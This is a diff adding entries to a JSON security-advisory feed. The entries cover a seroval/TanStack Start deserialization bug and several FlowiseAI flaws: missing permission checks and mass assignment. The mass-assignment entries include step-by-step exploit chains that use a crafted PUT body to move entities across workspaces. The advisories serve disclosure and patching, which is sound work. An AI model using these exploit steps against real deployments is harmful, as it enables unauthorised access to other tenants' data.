+      "description": "### Summary\nA type-confusion bug in seroval \u2264 1.5.2 ([upstream advisory](https://github.com/lxsmnsyc/seroval/security/advisories)) allowed a crafted JSON body sent to one TanStack Start server function to trigger invocation of a different client-referenced server function as a side effect of deserializing the request payload.\n\nThis is not an authentication bypass and not remote code execution. The mechanism only invokes server functions that the same client could already reach directly via /_serverFn/<id>, and the target function's full middleware chain \u2014 including any user-supplied authentication, authorization, and inputValidator \u2014 runs as it would on a direct call.\n\n### Impact\nTo be exploitable in any meaningful sense, an application would need to expose a client-referenced server function that:\n\n- [ ] Performs a privileged side effect, and\n- [ ] Has no authentication/authorization middleware, and\n- [ ] Has no input validation\n\nA function meeting all three is already directly callable by any unauthenticated client at its own endpoint, so the practical impact on correctly-written applications is nil. The residual concerns are:\n\nA request to function A could cause function B to also execute, which may surprise observability/audit logging that keys off the request URL.\n\nRequest-level middleware (as opposed to per-function middleware) does not re-run for the inner invocation.\nServer-only functions (isClientReferenced: false) cannot be reached through this mechanism.\n\n### Patches\nUpgrade to @tanstack/start-server-core \u2265 1.167.30 (or the equivalent dated release of @tanstack/react-start / @tanstack/solid-start). The fix bumps seroval to \u2265 1.5.3 and adds defense-in-depth to the serialization adapter plugin shape so adapter payloads cannot be confused with internal seroval node types.\n\n### Workarounds\nIf you cannot upgrade immediately, ensure every createServerFn(...) exposed to the client has both an .inputValidator(...) and authentication/authorization middleware via .middleware([...]). This is recommended regardless of this advisory.\n\n### Credits\n- [Mufeed VH](https://x.com/mufeedvh) of [Winfunc Research](https://winfunc.com/)\n- Upstream fix coordinated with Seroval maintainers https://github.com/lxsmnsyc/seroval",
+      "first_seen": "2026-05-14T18:04:02.409328+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.409328+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/TanStack/router/security/advisories/GHSA-9m65-766c-r333",
+        "https://github.com/advisories/GHSA-9m65-766c-r333",
+        "https://github.com/lxsmnsyc/seroval/security/advisories"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "TanStack Start - Server Core: Inbound server-function request deserialization could invoke a sibling client-referenced server function"
+    },
+    {
+      "canonical_id": "GHSA-hmg2-jjjx-jcp2",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-862"
+      ],
+      "description": "### FINDING 4: OpenAI Assistants Vector Store - No Auth on CRUD Operations\n**Severity**: HIGH (CVSS ~8.1)\n**Type**: CWE-306 (Missing Authentication for Critical Function)\n**File**: `packages/server/src/routes/openai-assistants-vector-store/index.ts`\n\n**Description**: ALL CRUD endpoints for OpenAI Assistants Vector Store have no authentication middleware AND the route path `/api/v1/openai-assistants-vector-store` is NOT in `WHITELIST_URLS`. However, it is also NOT protected by the main auth middleware when accessed via API key \u2014 the route requires API key auth (not whitelisted), but NO permission checks exist on any operation.\n\nThe real issue is that the routes have no `checkAnyPermission()` middleware, meaning any authenticated user regardless of role can:\n- Create vector stores\n- Upload files to vector stores\n- Delete vector stores and files\n- Modify any vector store\n\n**Evidence**:\n```typescript\n// No permission middleware on any route\nrouter.post('/', controller.createAssistantVectorStore)          // No permission check\nrouter.put(['/', '/:id'], controller.updateAssistantVectorStore) // No permission check\nrouter.delete(['/', '/:id'], controller.deleteAssistantVectorStore) // No permission check\nrouter.post('/:id', getMulterStorage().array('files'), controller.uploadFilesToAssistantVectorStore) // No permission check\n```\n\n**Impact**: Any authenticated user can manipulate OpenAI vector stores, upload malicious files, delete data, or exfiltrate stored documents regardless of their assigned permissions.",
+      "first_seen": "2026-05-14T18:04:02.410520+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410520+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2",
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-hmg2-jjjx-jcp2",
+        "https://github.com/advisories/GHSA-hmg2-jjjx-jcp2"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "FlowiseAI: Vector Store No Permission Checks"
+    },
+    {
+      "canonical_id": "GHSA-mq53-pc65-wjc4",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-915"
+      ],
+      "description": "## Summary\n\n**Type:** Mass assignment via `Object.assign(entity, body)` -> client-controlled `workspaceId` (and on create, `id`) overwritten on the Evaluation entity -> cross-workspace data takeover and IDOR.\n**File:** `packages/server/src/services/evaluations/index.ts`\n**Root cause:** The Evaluation controller/service constructs a `new Evaluation()` and copies the request body into it via `Object.assign(...)` without an explicit field allowlist. The request body therefore can include `workspaceId`, `id`, `createdDate`, `updatedDate`. The server only rebinds *some* of these after the assign (e.g. on create, it overwrites `workspaceId` but not `id`; on update, it overwrites `id` but not `workspaceId`). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the evaluation entity's sibling controllers and as `DocumentStore` before it was patched in commit 840d2ae.\n\n## Affected Code\n\n**File:** `packages/server/src/services/evaluations/index.ts`\n\n```ts\n// at line 69\nObject.assign(newEvaluation, body)      // <-- BUG: body.id, body.workspaceId, body.createdDate, body.updatedDate accepted\n```\n\n**Why it's wrong:** `Object.assign(target, source)` copies every own enumerable property of `source` onto `target`. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so `workspaceId` set in the request body lands as the new `workspaceId` of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.\n\n## Exploit Chain\n\n1. Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.\n2. Attacker creates a evaluation in workspace A via the documented API (or reuses an existing one they own). They note its entity `id`.\n3. Attacker issues a `PUT /api/v1/evaluations/<id>` (or equivalent endpoint) with a JSON body that includes `\"workspaceId\": \"<workspace-B-id>\"` (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.\n4. The controller calls `Object.assign(updateEntity, body)`. The body's `workspaceId` overwrites the entity's `workspaceId` field. The persistence layer commits the row.\n5. Final state: the evaluation row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.\n\n## Security Impact\n\n**Severity:** High. Cross-workspace boundary violation by any authenticated workspace member.\n**Attacker capability:** Any authenticated user with permission to update a evaluation can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). Evaluation runs (which may include captured prompts, model outputs, scoring data) can be moved cross-workspace via `workspaceId` overwrite, exposing the data to attacker workspace members.\n**Preconditions:** Authenticated session with edit permission for the source evaluation. No second factor required. Workspace UUIDs are exposed via the `/api/v1/workspaces` listing or via any cross-referenced object's `workspaceId` field, so target enumeration is trivial.\n**Differential:** PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the `workspaceId` field; vulnerable build accepts it and persists it.\n\n## Suggested Fix\n\nAlready fixed in PR https://github.com/FlowiseAI/Flowise/pull/6050 (allowlist pattern applied).\n\n```ts\n// Allowlist pattern (matches commit 840d2ae for DocumentStore):\nconst updatedEvaluation = new Evaluation()\nif (body.<allowed_field_1> !== undefined) updatedEvaluation.<allowed_field_1> = body.<allowed_field_1>\nif (body.<allowed_field_2> !== undefined) updatedEvaluation.<allowed_field_2> = body.<allowed_field_2>\n// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.\n```\n\nRegression tests should assert that a request body containing `workspaceId`, `id`, `createdDate`, or `updatedDate` is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.",
+      "first_seen": "2026-05-14T18:04:02.410362+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410362+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/FlowiseAI/Flowise/commit/dc07f4062b852033554543a3cff3daf3433b0dac",
+        "https://github.com/FlowiseAI/Flowise/pull/6050",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2",
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-mq53-pc65-wjc4",
+        "https://github.com/advisories/GHSA-mq53-pc65-wjc4"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "FlowiseAI: Evaluation create+update mass-assignment allows cross-workspace evaluation takeover"
+    },
+    {
+      "canonical_id": "GHSA-wxrr-jp8m-qq7f",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-915"
+      ],
+      "description": "## Summary\n\n**Type:** Mass assignment via `Object.assign(entity, body)` -> client-controlled `workspaceId` (and on create, `id`) overwritten on the Evaluator entity -> cross-workspace data takeover and IDOR.\n**File:** `packages/server/src/Interface.Evaluation.ts`\n**Root cause:** The Evaluator controller/service constructs a `new Evaluator()` and copies the request body into it via `Object.assign(...)` without an explicit field allowlist. The request body therefore can include `workspaceId`, `id`, `createdDate`, `updatedDate`. The server only rebinds *some* of these after the assign (e.g. on create, it overwrites `workspaceId` but not `id`; on update, it overwrites `id` but not `workspaceId`). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the evaluator entity's sibling controllers and as `DocumentStore` before it was patched in commit 840d2ae.\n\n## Affected Code\n\n**File:** `packages/server/src/Interface.Evaluation.ts`\n\n```ts\n// at line 85\nObject.assign(newEvaluator, body)       // <-- BUG: body.id, body.workspaceId, body.createdDate, body.updatedDate accepted\n```\n\n**Why it's wrong:** `Object.assign(target, source)` copies every own enumerable property of `source` onto `target`. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so `workspaceId` set in the request body lands as the new `workspaceId` of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.\n\n## Exploit Chain\n\n1. Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.\n2. Attacker creates a evaluator in workspace A via the documented API (or reuses an existing one they own). They note its entity `id`.\n3. Attacker issues a `PUT /api/v1/evaluators/<id>` (or equivalent endpoint) with a JSON body that includes `\"workspaceId\": \"<workspace-B-id>\"` (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.\n4. The controller calls `Object.assign(updateEntity, body)`. The body's `workspaceId` overwrites the entity's `workspaceId` field. The persistence layer commits the row.\n5. Final state: the evaluator row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.\n\n## Security Impact\n\n**Severity:** High. Cross-workspace boundary violation by any authenticated workspace member.\n**Attacker capability:** Any authenticated user with permission to update a evaluator can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). Evaluators score model outputs and can be moved into another workspace via `workspaceId` overwrite, making the evaluator (and its scoring rubric) appear there.\n**Preconditions:** Authenticated session with edit permission for the source evaluator. No second factor required. Workspace UUIDs are exposed via the `/api/v1/workspaces` listing or via any cross-referenced object's `workspaceId` field, so target enumeration is trivial.\n**Differential:** PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the `workspaceId` field; vulnerable build accepts it and persists it.\n\n## Suggested Fix\n\nAlready fixed in PR https://github.com/FlowiseAI/Flowise/pull/6050 (allowlist pattern applied).\n\n```ts\n// Allowlist pattern (matches commit 840d2ae for DocumentStore):\nconst updatedEvaluator = new Evaluator()\nif (body.<allowed_field_1> !== undefined) updatedEvaluator.<allowed_field_1> = body.<allowed_field_1>\nif (body.<allowed_field_2> !== undefined) updatedEvaluator.<allowed_field_2> = body.<allowed_field_2>\n// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.\n```\n\nRegression tests should assert that a request body containing `workspaceId`, `id`, `createdDate`, or `updatedDate` is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.",
+      "first_seen": "2026-05-14T18:04:02.410320+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410320+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/FlowiseAI/Flowise/commit/dc07f4062b852033554543a3cff3daf3433b0dac",
+        "https://github.com/FlowiseAI/Flowise/pull/6050",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2",
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wxrr-jp8m-qq7f",
+        "https://github.com/advisories/GHSA-wxrr-jp8m-qq7f"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "FlowiseAI: Evaluator create+update mass-assignment allows cross-workspace evaluator takeover"
     }
   ],
-  "correlated_at": "2026-05-14T17:17:09.592739+00:00"
+  "correlated_at": "2026-05-14T18:04:07.321563+00:00"
 }
